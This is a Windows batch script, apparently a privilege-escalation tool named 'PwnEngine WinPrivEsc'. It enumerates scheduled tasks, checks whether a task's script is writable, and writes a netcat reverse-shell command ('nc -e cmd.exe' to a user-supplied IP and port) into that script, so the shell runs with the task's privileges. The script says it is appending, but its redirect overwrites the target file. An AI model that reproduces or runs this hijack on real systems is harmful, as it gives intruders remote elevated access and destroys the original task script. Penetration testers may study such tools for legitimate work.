@echo off
color 0D
:: color 0A green
:: color 07 regular
:: color 04 red

::: $$$$$$$\                          $$$$$$$$\                     $$\                         
::: $$  __$$\                         $$  _____|                    \__|                        
::: $$ |  $$ |$$\  $$\  $$\ $$$$$$$\  $$ |      $$$$$$$\   $$$$$$\  $$\ $$$$$$$\   $$$$$$\      
::: $$$$$$$  |$$ | $$ | $$ |$$  __$$\ $$$$$\    $$  __$$\ $$  __$$\ $$ |$$  __$$\ $$  __$$\     
::: $$  ____/ $$ | $$ | $$ |$$ |  $$ |$$  __|   $$ |  $$ |$$ /  $$ |$$ |$$ |  $$ |$$$$$$$$ |    
::: $$ |      $$ | $$ | $$ |$$ |  $$ |$$ |      $$ |  $$ |$$ |  $$ |$$ |$$ |  $$ |$$   ____|    
::: $$ |      \$$$$$\$$$$  |$$ |  $$ |$$$$$$$$\ $$ |  $$ |\$$$$$$$ |$$ |$$ |  $$ |\$$$$$$$\     
::: \__|       \_____\____/ \__|  \__|\________|\__|  \__| \____$$ |\__|\__|  \__| \_______|    
:::                                                       $$\   $$ |                            
:::                                                       \$$$$$$  |                            
:::                                                        \______/                             
::: $$\      $$\ $$\           $$$$$$$\            $$\            $$$$$$$$\                     
::: $$ | $\  $$ |\__|          $$  __$$\           \__|           $$  _____|                    
::: $$ |$$$\ $$ |$$\ $$$$$$$\  $$ |  $$ | $$$$$$\  $$\ $$\    $$\ $$ |       $$$$$$$\  $$$$$$$\ 
::: $$ $$ $$\$$ |$$ |$$  __$$\ $$$$$$$  |$$  __$$\ $$ |\$$\  $$  |$$$$$\    $$  _____|$$  _____|
::: $$$$  _$$$$ |$$ |$$ |  $$ |$$  ____/ $$ |  \__|$$ | \$$\$$  / $$  __|   \$$$$$$\  $$ /      
::: $$$  / \$$$ |$$ |$$ |  $$ |$$ |      $$ |      $$ |  \$$$  /  $$ |       \____$$\ $$ |      
::: $$  /   \$$ |$$ |$$ |  $$ |$$ |      $$ |      $$ |   \$  /   $$$$$$$$\ $$$$$$$  |\$$$$$$$\ 
::: \__/     \__|\__|\__|  \__|\__|      \__|      \__|    \_/    \________|\_______/  \_______|

for /f "delims=: tokens=*" %%A in ('findstr /b ::: "%~f0"') do @echo(%%A

echo.
echo.

echo.
echo /***********************************************/
echo Starting script...\n
echo /***********************************************/
echo.
setlocal enabledelayedexpansion

REM List all scheduled tasks
echo [INFO] Listing all scheduled tasks...
schtasks /query /fo LIST /v > tasks.txt
if %errorlevel% neq 0 (
    echo [ERROR] Failed to list scheduled tasks. Ensure 'schtasks' is available and you have permissions.
    pause
    exit /b 1
)
echo [INFO] Scheduled tasks listed successfully.

echo [INFO] Displaying tasks...
type tasks.txt
if %errorlevel% neq 0 (
    echo [ERROR] Failed to display tasks. The file 'tasks.txt' may be missing or inaccessible.
    pause
    exit /b 1
)
echo [INFO] Tasks displayed successfully.

REM Prompt user for the path of the executable or script the task runs
echo [INFO] Prompting for task path...
set /p taskpath=Enter the full path to the executable or script the task runs (e.g., C:\path\to\script.bat): 
if "%taskpath%"=="" (
    echo [ERROR] No task path provided. Exiting.
    pause
    exit /b 1
)
echo [INFO] Task path provided: %taskpath%

REM Verify the task path exists
echo [INFO] Verifying task path exists...
if not exist "%taskpath%" (
    echo [ERROR] The specified task path does not exist. Exiting.
    pause
    exit /b 1
)
echo [INFO] Task path verified successfully.

REM Prompt user for IP, port, and path to nc
echo [INFO] Prompting for IP address...
set /p ip=Enter the IP address for the reverse shell: 
if "%ip%"=="" (
    echo [ERROR] No IP address provided. Exiting.
    pause
    exit /b 1
)
echo [INFO] IP address provided: %ip%

echo [INFO] Prompting for port...
set /p port=Enter the port for the reverse shell: 
if "%port%"=="" (
    echo [ERROR] No port provided. Exiting.
    pause
    exit /b 1
)
echo [INFO] Port provided: %port%

echo [INFO] Prompting for path to nc.exe...
set /p ncpath=Enter the full path to nc.exe (e.g., "C:\path\to\nc.exe"): 
if "%ncpath%"=="" (
    echo [ERROR] No path to nc.exe provided. Exiting.
    pause
    exit /b 1
)
echo [INFO] Path to nc.exe provided: %ncpath%

REM Verify nc.exe exists
echo [INFO] Verifying nc.exe exists...
if not exist "%ncpath%" (
    echo [ERROR] The specified nc.exe path does not exist. Exiting.
    pause
    exit /b 1
)
echo [INFO] nc.exe verified successfully.

pause

REM Check if the task path is writable
echo [INFO] Checking if the task path is writable...
icacls "%taskpath%" | findstr /i "(F) (W)"
if %errorlevel% neq 0 (
    echo [INFO] You do not have Full or Write permissions on this file.
    echo [ERROR] Cannot modify the task. Exiting.
    pause
    exit /b 1
)
echo [INFO] You have Full or Write permissions on this file.
pause

REM Check if the task path is a .bat file
echo [INFO] Make sure the task path is a .bat file...
echo "%taskpath%"

echo [INFO] Appending reverse shell code to %taskpath%...
    if %errorlevel% neq 0 (
        echo [ERROR] Failed to append reverse shell code to the file. Check permissions.
        pause
        exit /b 1
    )
    echo start /b "%ncpath%" -e cmd.exe %ip% %port% > "%taskpath%"
    if %errorlevel% neq 0 (
        echo [ERROR] Failed to append reverse shell code to the file. Check permissions.
        pause
        exit /b 1
    )
    echo [INFO] Reverse shell code appended.


REM Clean up
echo [INFO] Cleaning up temporary files...
del tasks.txt 2>nul
if %errorlevel% neq 0 (
    echo [WARNING] Failed to delete tasks.txt. It may not exist or is inaccessible.
)

echo [INFO] Script completed successfully.
pause
